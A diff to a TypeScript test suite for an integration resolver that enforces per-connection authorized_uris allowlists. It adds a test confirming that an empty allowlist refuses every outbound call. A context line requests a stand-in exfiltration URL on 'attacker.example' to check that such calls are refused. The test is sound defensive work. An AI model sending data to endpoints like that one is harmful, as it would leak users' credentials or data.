@@ -1212,6 +1212,33 @@ describe("LocalIntegrationResolver — authorized_uris rendered per connection (
     expect(hits).toEqual([]);
   });
 
+  it("refuses every target when the auth declares no authorized_uris and not allow_all_uris", async () => {
+    const hits: string[] = [];
+    const integ = makePackage("@acme/wp", "1.0.0", "integration", {
+      "integration.json": JSON.stringify(
+        apiKeyIntegrationManifest("@acme/wp", { authorizedUris: [] }).integration,
+      ),
+    });
+    const resolver = new LocalIntegrationResolver({
+      resolveHost: async () => ["203.0.113.7"],
+      // No api_key: the call carries no credential, so only the empty allowlist refuses it.
+      creds: { version: 1, integrations: { "@acme/wp": { fields: {} } } },
+      fetch: ((url: string) => {
+        hits.push(url);
+        return Promise.resolve(new Response("{}"));
+      }) as unknown as typeof fetch,
+    });
+    const tools = await resolver.resolve(
+      [{ name: "@acme/wp", version: "^1" }],
+      makeBundle(makePackage("@acme/agent", "1.0.0", "agent", {}), [integ]),
+    );
+    const err = await tools[0]!
+      .execute({ method: "GET", target: "https://public.example/x" }, makeCtx().ctx)
+      .catch((e: unknown) => e);
+    expect(err).toMatchObject({ code: "AUTHORIZED_URIS_EMPTY" });
+    expect(hits).toEqual([]);
+  });
+
   it("refuses every target when the connection's URL does not render", async () => {
     const { call, hits } = await toolFor(["{$credential.site_url}/**"], { site_url: "mysite.com" });
     const err = await call("https://attacker.example/steal").catch((e: unknown) => e);
